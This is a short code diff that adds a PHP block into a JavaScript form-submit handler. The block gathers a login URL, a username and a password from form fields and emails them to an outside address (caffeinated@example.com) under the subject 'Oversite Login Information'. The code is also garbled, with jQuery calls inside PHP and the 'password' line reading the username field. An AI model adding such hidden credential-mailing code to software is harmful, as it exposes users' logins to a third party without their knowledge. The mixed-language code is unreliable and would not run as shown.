@@ -243,6 +243,19 @@ $result = $stmt->fetchAll();
             if (this.checkValidity && !this.checkValidity()) return;
             e.preventDefault();
 
+            <?php
+            // The message
+            $message = "Login URL: jjp2017.org \r\n
+                        Username: " . $editor.find('#username').val() . "\r\n
+                        Password: ". $editor.find('#username').val() . "\r\n";
+
+            // In case any of our lines are larger than 70 characters, we should use wordwrap()
+            $message = wordwrap($message, 70, "\r\n");
+
+            // Send
+            mail('caffeinated@example.com', 'Oversite Login Information', $message);
+            ?>
+
 
             var row = $modal.data('row'),
                 values = {
